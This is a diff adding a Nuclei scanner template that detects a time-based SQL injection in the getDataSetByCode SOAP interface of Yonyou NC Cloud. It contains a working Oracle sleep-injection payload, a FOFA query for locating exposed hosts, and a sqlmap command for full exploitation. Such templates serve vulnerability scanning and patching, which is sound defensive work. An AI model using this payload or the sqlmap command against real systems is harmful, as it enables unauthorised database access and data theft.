@@ -1,0 +1,48 @@
+id: yonyou-nc-cloud-getDataSetByCode-sqli
+info:
+  name: 用友 NC Cloud ISmartQueryWebService 接口 getDataSetByCode - sqli
+  author: leadlife
+  severity: high
+  description: 用友NC cloud getDataSetByCode 接口存在SQL注入漏洞，该漏洞允许攻击者在应用程序的数据库查询中注入恶意的SQL代码。通常发生在应用程序未对用户输入进行充分验证和过滤。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+    sqlmap: sqlmap -r sql.txt --random-agent --batch --dbms=Oracle --risk 3 --level 5
+    tips: not need "||" 直接 *
+    repair: 官方已发布安全补丁，请及时安装，补丁下载地址：https://security.yonyou.com/#/home
+  tags: sqli,yonyou,nccloud,oa,time
+
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /uapws/service/nc.itf.smart.ISmartQueryWebService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: urn:getDataSetByCode
+        Content-Length: 728
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ism="http://smart.itf.nc/ISmartQueryWebService">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <ism:getDataSetByCode>
+                <ism:string>'||(SELECT CHR(90)||CHR(99)||CHR(71)||CHR(77) FROM DUAL WHERE 2338=2338 AND 7280=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(113)||CHR(87)||CHR(101),4))||'</ism:string>
+                <ism:string1>sonoras imperio</ism:string1>
+                <ism:map>
+                    <ism:key>quae divum incedo</ism:key>
+                    <ism:value>verrantque per auras</ism:value>
+                </ism:map>
+                <ism:stringarrayItem>per auras</ism:stringarrayItem>
+              <ism:getDataSetByCode>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 4 && duration < 7
+        condition: and
